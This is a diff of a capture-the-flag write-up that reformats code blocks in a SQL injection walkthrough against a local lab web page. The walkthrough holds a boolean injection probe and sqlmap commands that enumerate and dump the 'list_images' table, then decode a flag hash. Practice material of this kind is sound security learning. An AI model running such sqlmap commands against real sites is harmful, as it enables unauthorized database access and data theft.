@@ -11,13 +11,18 @@ In the search field, search `1 AND 1=1`
 ## Manipulation
 
 Open terminal (Powershell), run  
-```python sqlmap.py --url="http://192.168.1.59/?page=searchimg&id=1&Submit=Submit# --tables```  
+```bash
+python sqlmap.py --url="http://192.168.1.59/?page=searchimg&id=1&Submit=Submit# --tables
+```  
 
 This displays all the databases & their tables.  
 Thereafter tables can be dumped  
-```python sqlmap.py --url="http://192.168.1.59/?page=searchimg&id=1&Submit=Submit# --dump -T list_images```  
+```bash
+python sqlmap.py --url="http://192.168.1.59/?page=searchimg&id=1&Submit=Submit# --dump -T list_images
+```  
 where `list_images` refers to the table name  
-```
+
+```bash
 +----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
 | id | url                              | title     | comment                                                                                                               |
 +----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
@@ -31,7 +36,9 @@ where `list_images` refers to the table name
 ```
 
 Decode flag  
-`1928e8083cf461a51303633093573c46 -> albatroz -> F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188`  
+```bash
+1928e8083cf461a51303633093573c46 -> albatroz -> F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188
+```  
 
 
 ## Resolve
